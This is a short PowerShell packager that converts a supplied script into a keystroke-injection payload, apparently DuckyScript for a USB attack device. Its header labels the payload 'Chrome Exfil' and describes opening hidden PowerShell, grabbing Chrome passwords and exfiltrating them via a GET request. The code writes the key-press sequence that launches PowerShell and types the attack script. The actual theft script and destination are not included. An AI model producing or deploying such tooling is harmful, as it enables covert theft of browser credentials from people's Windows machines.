# Simple packager for powershell command and submission creator.
param([Parameter(Mandatory=$true)][string]$scriptFileName)

$script = Get-Content -Raw $scriptFileName
$outputFile = "payload.txt"

"REM Title: Chrome Exfil",
"REM Author: Robert Wallhead",
"REM Description: Opens hidden powershell, grabs Chrome passwords, exfils via Chrome GET request.",
"REM Target: Windows 10 (Powershell + Chrome)",
"REM Version: 1.0",
"REM Category: Exfiltration",
"DELAY 5000",
"GUI r",
"DELAY 250",
"STRING powershell",
"ENTER",
"DELAY 2500",
"STRING pwsh",
"ENTER",
"DELAY 2500" | Out-File -e "ASCII" "$outputFile"

$script.split("`n") | ForEach {"STRING $_`nENTER" | Out-File -a -e "ASCII" "$outputFile"}

"ENTER" | Out-File -a -e "ASCII" "$outputFile"
